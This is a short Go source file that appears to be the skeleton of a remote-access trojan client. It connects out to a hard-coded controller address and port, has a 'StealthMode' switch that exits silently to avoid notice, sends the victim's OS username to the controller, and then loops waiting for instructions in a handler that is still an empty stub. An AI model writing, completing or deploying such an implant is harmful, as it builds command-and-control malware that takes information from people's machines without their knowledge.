package main

import (
	"encoding/gob"
	"log"
	"net"
	"os"
	"os/user"
)

type Client struct {
	OS_username     string
	OperatingSystem string
	LocalIP         net.IP
	PublicIP        net.IP
}

var (
	StealthMode bool = false
	RemoteIP         = "127.0.0.1"
	RemotePort       = "1337"
)

func main() {
	conn, err := net.Dial("tcp", RemoteIP+":"+RemotePort)
	if err != nil {
		if StealthMode == true {
			os.Exit(0)
		} else {
			log.Fatalf("Error happened connecting to server: %v\n", err)
		}
	}
	defer conn.Close()
	if err := sendOSInfo(conn); err != nil {
		if StealthMode == true {
			os.Exit(0)
		} else {
			log.Fatalf("Error happened getting OS info: %v\n", err)
		}
	}
	for {
		awaitInstructions(conn)
	}
}

func sendOSInfo(c net.Conn) error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	newClient := Client{
		OS_username: currentUser.Username,
	}

	enc := gob.NewEncoder(c)
	err = enc.Encode(newClient)
	if err != nil {
		return err
	}

	return nil
}

func awaitInstructions(c net.Conn) error {

	return nil
}
